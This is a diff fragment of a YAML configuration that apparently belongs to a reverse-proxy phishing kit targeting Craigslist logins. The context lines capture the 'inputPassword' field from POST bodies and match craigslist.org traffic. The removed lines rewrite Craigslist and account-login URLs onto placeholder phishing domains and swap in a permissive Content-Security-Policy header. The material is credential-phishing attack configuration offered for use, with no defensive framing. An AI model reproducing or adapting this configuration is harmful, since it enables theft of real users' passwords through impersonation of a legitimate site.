@@ -73,23 +73,6 @@ credentials:
     key: 'inputPassword'
     search: 'post_body'
 
-rewrite_rules:
-  - type: 'url'
-    source: 'https://www.craigslist.org'
-    destination: 'https://www.{phish_sub}.{phish_domain}'
-  - type: 'url'
-    source: 'https://accounts.craigslist.org'
-    destination: 'https://accounts.{phish_sub}.{phish_domain}'
-  - type: 'url'
-    source: 'https://*.craigslist.org'
-    destination: 'https://{phish_sub}.{phish_domain}'
-  - type: 'header'
-    source: 'Content-Security-Policy'
-    destination: "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;"
-  - type: 'form'
-    source: 'https://accounts.craigslist.org/login'
-    destination: 'https://accounts.{phish_sub}.{phish_domain}/login'
-
 match_rules:
   domain_match:
     - 'craigslist.org'
